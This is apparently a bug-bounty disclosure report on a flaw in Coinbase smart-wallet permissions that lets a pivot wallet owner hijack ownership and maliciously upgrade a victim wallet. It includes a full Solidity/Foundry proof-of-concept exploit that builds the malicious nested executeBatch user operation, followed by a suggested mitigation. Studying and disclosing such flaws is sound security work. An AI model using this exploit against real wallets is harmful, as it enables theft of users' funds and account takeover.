# Report 2709847: Smart wallets that enable permissions and are owned by any another kind of smart contract account can be ownership-hijacked & maliciously upgraded

## Summary:

If a Coinbase smart wallet (referred to as "victim wallet") has enabled smart wallet permissions by adding the PermissionManager singleton as an owner, and another smart contract account (referred to as "pivot wallet") is also an owner, the pivot wallet can be leveraged to perform undesirable unauthorized changes to sensitive configurations on the victim wallet, such as malicious upgrades to arbitrary implementations and ownership hijacking.
Such unauthorized ownership changes and implementation upgrades can be achieved by an attacker using a nested call to the pivot wallet's execution mechanism, such as executeBatch()or a similar function such as Gnosis Safe's execTransaction() function. This means an attacker can assume total control of the account, its assets, and its logic.

## Context

Smart-wallet-permissions lists the following as protocol invariants for PermissionManager.sol which must not be violable:
PermissionManager
Cannot make direct calls to CoinbaseSmartWallet to prevent updating owners or upgrading implementation.
Permissioned UserOps cannot make direct calls to CoinbaseSmartWallet to prevent updating owners or upgrading implementation.
These two invariants are violable as they do not account for another owner of the wallet possessing an execution mechanism and heightened priviliges. Self-calls for reentry and unauthorized alteration of sensitive state like ownership and implementation upgrades are prevented by the protocol, but external calls to an owner which indirectly achieve the same end result are not disallowed.

## Steps To Reproduce (full PoC included at end):

Initial Setup:

- Instantiate the ERC4337 Entrypoint contract (etched here)
- Deploy a paymaster (irrelevant to exploit but required by smart-wallet-permissions)
- Deploy the PermissionManager singleton.
- Deploy a PermissionContract
- Deploy two smart contract wallets (victimWallet and pivotWallet).
- Set up the wallets such that victimWallet has pivotWallet as an owner and vice versa
- Enable sessioned permissions for both wallets, by adding the PermissionManager as an owner to both.
- Create relevant structs and configure ERC4337 env:
- Create a permission using the previously deployed PermissionContract
- Create a malicious owner (I used a MockCoinbaseSmartWallet contract though an EOA would suffice)
- Deposit funds to the Entrypoint on behalf of the paymaster
  Nested executeBatch Call:
- Construct a permissioned UserOperation which passes PermissionManager's checks but contains a nested executeBatch call to the pivotWallet which "re-enters" the victim wallet
- The nested call will originate from pivotWallet and targets victimWallet.
- The malicious nested call will succeed due to the pivotWallet's heightened owner privileges on the victimWallet, allowing access-controlled operations such as adding a new malicious owner, removing existing legitimate owners, and performing an unauthorized upgrade of the victimWallet implementation.

## Execution:

Successful execution can be proven by calling permissionManager.isValidSignature() or victimWallet.validateUserOp() with the malicious permissioned user op
For e2e proof of concept, submit the malicious UserOperation to the entrypoint as a bundle, which will pass validation and then execute the batches of operations and result in unauthorized changes.

## Proof of Concept:

```solidity
Code 10.84 KiBUnwrap lines Copy Download
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import {Test, console2} from "forge-std/Test.sol";
import {PermissionCallable} from "src/mixins/PermissionCallable.sol";
import {MockCoinbaseSmartWallet} from "./mocks/MockCoinbaseSmartWallet.sol";
import {ERC4337, MockERC4337} from "solady/../test/utils/mocks/MockERC4337.sol";
import {PermissionManager} from "../src/PermissionManager.sol";
import {MockPermissionContract} from "./mocks/MockPermissionContract.sol";
import {UserOperation, UserOperationLib} from "src/utils/UserOperationLib.sol";
import {CoinbaseSmartWallet} from "smart-wallet/CoinbaseSmartWallet.sol";
import {MultiOwnable} from "smart-wallet/MultiOwnable.sol";
import {MagicSpend} from "magic-spend/MagicSpend.sol";
import {IEntryPoint} from "lib/smart-wallet/lib/account-abstraction/contracts/interfaces/IEntryPoint.sol";
import {ECDSA} from "solady/utils/ECDSA.sol";
import {EntrypointRuntimeBytecode} from "./EntrypointRuntimeBytecode.sol";
import {ERC1967Proxy} from "smart-wallet/../lib/webauthn-sol/lib/FreshCryptoLib/solidity/tests/WebAuthn_forge/lib/openzeppelin-contracts/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {UUPSUpgradeable} from "solady/utils/UUPSUpgradeable.sol";

contract Findings is Test, EntrypointRuntimeBytecode {
    PermissionManager permissionManager;
    uint256 ownerPk = uint256(keccak256("owner"));
    address owner = vm.addr(ownerPk);
    uint256 cosignerPk = uint256(keccak256("cosigner"));
    address cosigner = vm.addr(cosignerPk);
    uint256 permmissionSignerPk = uint256(keccak256("permissionSigner"));
    address permissionSigner = vm.addr(permmissionSignerPk);
    address entrypoint = 0x5FF137D4b0FDCD49DcA30c7CF57E578a026d2789;
    // userop
    uint256 callGasLimit = 491520;
    uint256 verificationGasLimit = 378989;
    uint256 preVerificationGas = 273196043;
    uint256 maxFeePerGas = 1000304;
    uint256 maxPriorityFeePerGas = 1000000;
    // withdraw request
    MagicSpend.WithdrawRequest withdrawRequest = MagicSpend.WithdrawRequest({
        asset: address(0x0),
        amount: 274908076657120,
        nonce: 0,
        expiry: type(uint48).max,
        signature: '' // empty; must be populated per test
    });

    MockCoinbaseSmartWallet account;
    MockPermissionContract successPermissionContract;
    MockPermissionContract failPermissionContract;

// when PermissionManager is enabled for a coinbase smart wallet with another smart contract wallet owner (eg a second coinbase smart wallet or a gnosis safe),
    // the second smart wallet can be leveraged to hijack ownership and perform malicious upgrades using a nested `executeBatch()`
    function test_hijackNestedExecuteBatch() public {
        _etchEntrypoint();
        MagicSpend paymaster = new MagicSpend(owner, 1);

        // configure PermissionManager singleton and dummy PermissionContract
        permissionManager = new PermissionManager(owner, cosigner);
        vm.startPrank(owner);
        permissionManager.setPaymasterEnabled(address(paymaster), true);
        successPermissionContract = new MockPermissionContract(false);
        permissionManager.setPermissionContractEnabled(address(successPermissionContract), true);
        vm.stopPrank();

        // deploy innocent smart contract wallets and initialize them with each other as owners
        MockCoinbaseSmartWallet victimWalletImpl = new MockCoinbaseSmartWallet(); // only victim ("first") wallet used as proxy for brevity, + to show malicious upgrade
        MockCoinbaseSmartWallet victimWallet = MockCoinbaseSmartWallet(payable(address(new ERC1967Proxy(address(victimWalletImpl), ''))));
        MockCoinbaseSmartWallet pivotWallet = new MockCoinbaseSmartWallet();
        bytes[] memory victimWalletOwners = new bytes[](2);
        victimWalletOwners[0] = abi.encode(owner);
        victimWalletOwners[1] = abi.encode(address(pivotWallet));
        victimWallet.initialize(victimWalletOwners);
        bytes[] memory pivotWalletOwners = new bytes[](1);
        pivotWalletOwners[0] = abi.encode(address(victimWallet));
        pivotWallet.initialize(pivotWalletOwners);

        // enable permissions on both wallets by adding PermissionManager singleton as owner to each
        vm.prank(address(victimWallet));
        pivotWallet.addOwnerAddress(address(permissionManager));
        vm.prank(address(pivotWallet));
        victimWallet.addOwnerAddress(address(permissionManager));

        // create dummy permission with approval
        PermissionManager.Permission memory permission = _createPermissionWithApproval(victimWallet);

        // create malicious owner wallet to be added via nested call to `pivotWallet.executeBatch()`
        address maliciousOwner = address(payable(new MockCoinbaseSmartWallet()));

        // deposit funds on behalf of paymaster
        vm.deal(address(paymaster), 100 ether);
        vm.prank(address(paymaster));
        entrypoint.call{value: 10 ether}('');

        // form malicious `userOp` containing nested `executeBatch()` call
        UserOperation memory userOp = _createUserOpNestedExecuteBatch(permission, address(paymaster), payable(address(victimWallet)), address(pivotWallet), maliciousOwner);

        withdrawRequest.signature = _getSignature(paymaster.getHash(address(victimWallet), withdrawRequest), ownerPk);
        userOp.paymasterAndData = abi.encodePacked(paymaster, abi.encode(withdrawRequest));

        // `entryPoint.getUserOpHash(userOp)`
        (, bytes memory ret) = entrypoint.call(bytes.concat(hex'a6193531', abi.encode(userOp)));
        bytes32 userOpHash = bytes32(ret);

        userOp.signature = victimWallet.wrapSignature(0, _getSignature(userOpHash, ownerPk));

        PermissionManager.PermissionedUserOperation memory permissionedUserOp;
        permissionedUserOp.userOp = userOp;
        permissionedUserOp.permission = permission;

        permissionedUserOp.userOpSignature = _getSignature(userOpHash, permmissionSignerPk);
        permissionedUserOp.userOpCosignature = _getSignature(userOpHash, cosignerPk);

        // malicious permissioned `userOp` passes `isValidSignature()` check
        bytes4 magicValue = permissionManager.isValidSignature(userOpHash, abi.encode(permissionedUserOp));
        assertEq(magicValue, bytes4(0x1626ba7e));

        // malicious permissioned `userOp` passes `validateUserOp()` check
        vm.prank(entrypoint);
        victimWallet.validateUserOp(userOp, userOpHash, 0);

        // execute `userOp` which hijacks the first CB smart wallet by leveraging its other owner
        UserOperation[] memory ops = new UserOperation[](1);
        ops[0] = userOp;
        bytes memory handleOpsCall = abi.encodeWithSelector(0x1fad948c, ops, payable(address(0xc0ffee)));
        entrypoint.call(handleOpsCall);
    }

function _createUserOpNestedExecuteBatch(PermissionManager.Permission memory permission, address paymaster, address payable victimWallet, address pivotWallet, address maliciousOwner) internal returns (UserOperation memory) {
        UserOperation memory userOp;

        userOp.sender = victimWallet;
        // dummy placeholders
        userOp.nonce = 0;
        userOp.callGasLimit = callGasLimit;
        userOp.verificationGasLimit = verificationGasLimit;
        userOp.preVerificationGas = preVerificationGas;
        userOp.maxFeePerGas = maxFeePerGas;
        userOp.maxPriorityFeePerGas = maxPriorityFeePerGas;

        CoinbaseSmartWallet.Call[] memory calls = new CoinbaseSmartWallet.Call[](2);
        bytes memory beforeCallsData = abi.encodeWithSelector(PermissionManager.beforeCalls.selector, permission, paymaster, cosigner);
        calls[0] = CoinbaseSmartWallet.Call(address(permissionManager), 0, beforeCallsData);

        // populate `calls` with a nested ExecuteBatch call to the second smart wallet owner which "reenters" the first smart wallet with malicious owner changes and an upgrade
        CoinbaseSmartWallet.Call[] memory nestedCalls = new CoinbaseSmartWallet.Call[](4);
        bytes memory maliciousAddOwnerCall = abi.encodeWithSelector(MultiOwnable.addOwnerAddress.selector, maliciousOwner);
        nestedCalls[0] = CoinbaseSmartWallet.Call(victimWallet, 0, maliciousAddOwnerCall);
        bytes memory ownerAtIndex0 = CoinbaseSmartWallet(victimWallet).ownerAtIndex(0);
        bytes memory maliciousRemoveOwnerCall0 = abi.encodeWithSelector(MultiOwnable.removeOwnerAtIndex.selector, 0, ownerAtIndex0);
        nestedCalls[1] = CoinbaseSmartWallet.Call(victimWallet, 0, maliciousRemoveOwnerCall0);
        bytes memory maliciousUpgradeCall = abi.encodeWithSelector(UUPSUpgradeable.upgradeToAndCall.selector, maliciousOwner, '');
        nestedCalls[2] = CoinbaseSmartWallet.Call(victimWallet, 0, maliciousUpgradeCall);
        bytes memory ownerAtIndex1 = CoinbaseSmartWallet(victimWallet).ownerAtIndex(1);
        bytes memory maliciousRemoveOwnerCall1 = abi.encodeWithSelector(MultiOwnable.removeOwnerAtIndex.selector, 1, ownerAtIndex1);
        nestedCalls[3] = CoinbaseSmartWallet.Call(victimWallet, 0, maliciousRemoveOwnerCall1);

        bytes memory nestedExecuteBatchData = abi.encodeWithSelector(CoinbaseSmartWallet.executeBatch.selector, nestedCalls);

        // calls == [<ValidBeforeCalls>, <ExecuteBatch(<AddMaliciousOwnerCall>,<RemoveExistingOwner0>,<MaliciousUpgrade>,<RemoveExistingOwner1>)>]
        calls[1] = CoinbaseSmartWallet.Call(pivotWallet, 0, nestedExecuteBatchData);

        userOp.callData = abi.encodeWithSelector(
            CoinbaseSmartWallet.executeBatch.selector,
            calls
        );

        return userOp;
    }

    function _createPermissionWithApproval(MockCoinbaseSmartWallet smartAccount) internal returns (PermissionManager.Permission memory permWithApproval) {
        permWithApproval = _createPermission(smartAccount);

        bytes32 permissionHash = permissionManager.hashPermission(permWithApproval);
        bytes32 replaySafeHash = smartAccount.replaySafeHash(permissionHash);

        // user approves a permission
        bytes memory ownerSig = _getSignature(replaySafeHash, ownerPk);
        bytes memory approval = smartAccount.wrapSignature(0, ownerSig);
        permWithApproval.approval = approval;
    }

function _createPermission(MockCoinbaseSmartWallet smartAccount) internal returns (PermissionManager.Permission memory) {
        return PermissionManager.Permission({
            account: address(smartAccount),
            chainId: block.chainid,
            expiry: type(uint48).max,
            signer: abi.encode(permissionSigner),
            permissionContract: address(successPermissionContract),
            permissionValues: hex"",
            verifyingContract: address(permissionManager),
            approval: hex""
        });
    }

function _getSignature(bytes32 digest, uint256 privateKey) internal pure returns (bytes memory) {
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(privateKey, digest);
        return abi.encodePacked(r, s, v);
    }


    function _etchEntrypoint() internal {
        vm.etch(entrypoint, ENTRYPOINT_RUNTIME_BYTECODE);
    }
```

## Suggested mitigation

Block CoinbaseSmartWallet.Call(target, value, data)s where the target is an owner of the smart wallet, ie:
target == smartWallet || target == permissionManager || target == smartWalletOwners

## Impact

Total pwn of smart accounts configured as specified (owned another smart account- gnosis safe, ambire, smart-wallet, etc). Smart wallets configured as such become vulnerable upon enabling permissions
